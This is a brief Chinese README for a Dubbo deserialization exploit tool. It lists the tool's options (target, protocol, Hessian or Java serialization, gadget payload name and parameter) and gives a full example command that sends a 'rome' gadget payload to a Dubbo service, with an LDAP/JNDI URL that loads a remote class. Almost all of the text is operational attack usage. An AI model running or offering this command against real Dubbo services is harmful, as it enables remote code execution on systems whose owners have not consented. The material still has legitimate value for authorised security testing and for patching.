## Dubbo反序列化测试工具

usage: java -jar exp.jar [OPTION]
- -h                帮助信息
- -list             输出所有payload信息
- -p <arg>          payload名称
- -param <arg>      payload入参
- -protocol <arg>   [dubbo] 通讯协议名称，默认缺省dubbo
- -s <arg>          [hessian|java] 序列化类型，默认缺省hessian
- -t <arg>          目标，例：127.0.0.1:20880

例：
```
java -jar dubbo-exp.jar
-t
127.0.0.1:20881
-protocol
dubbo
-s
hessian
-p
rome
-param
ldap://127.0.0.1:43658/Calc
```
